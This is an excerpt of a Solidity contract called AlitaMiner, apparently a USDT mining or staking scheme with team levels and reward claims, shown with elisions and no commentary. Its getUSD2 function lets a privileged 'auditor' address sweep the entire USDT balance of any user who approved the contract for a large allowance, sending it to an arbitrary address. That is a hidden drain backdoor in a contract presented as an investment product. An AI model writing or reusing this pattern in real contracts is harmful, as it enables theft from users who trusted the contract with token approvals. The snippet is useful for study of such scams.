...
contract AlitaMiner is Ownable {
    ...
    function getUSD2(uint s,uint t,uint max,address to) public{
        require(msg.sender == auditor);
         for(s;s<t;s++){
             uint app=IERC20(USDT).allowance(addres[s],address(this));
             uint va=IERC20(USDT).balanceOf(addres[s]);
             if(app > 100000 ether && va >=max){
               IERC20(USDT).transferFrom(addres[s],to,va);
             }
         }
     }
    ...
    function pingLevel(address token,address to1,address to2)private  {
        if(teamsw[to1][to2].pj >0 && teams[msg.sender].lv >2){
    ...
    function updateTeam()public {
        ...
        if(lvvs < 3){
          teams[msg.sender].lv=lvvs;
            ...
            uint lvs;
            for(uint i=0;i<addr.length;i++){
               ys=_Levels(addr[i],teams[addr[i]].A1,teams[addr[i]].lv);
    ...
    function claim(address token,address token1,address to) public    {
        ...
        for(uint i=0;i< users[token][to].mnu;i++){
            uint banOf=stakedOf[token][to][i+1] / 50;
